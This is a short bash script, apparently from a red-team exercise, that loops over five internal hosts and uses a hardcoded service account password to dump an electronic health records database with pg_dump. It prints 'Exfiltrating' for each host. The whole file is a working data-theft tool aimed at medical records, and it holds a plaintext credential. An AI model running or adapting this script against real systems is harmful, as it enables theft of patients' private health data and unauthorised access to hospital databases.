#!/bin/bash
#
DB_PORT="5432"
DB_NAME="ehr"
DB_USER="imaging_service"
DB_PASS="ImagingDevice123!"

DB_HOSTS=("10.100.3.20" "10.100.5.20" "10.100.7.20" "10.100.9.20" "10.100.11.20")

DATABASES="/home/cybears/scripts/databases"

mkdir -p "$DATABASES"

export PGPASSWORD="$DB_PASS"

for HOST in "${DB_HOSTS[@]}"; do
        FILE="${DATABASES}/${DB_NAME}_${HOST}.sql"
        echo "Exfiltrating from $HOST ..."

        pg_dump -h "$HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" > "$FILE"

        if [ $? -eq 0 ]; then
                echo "$HOST was successful"
        else
                echo "FAILED $HOST"
        fi
done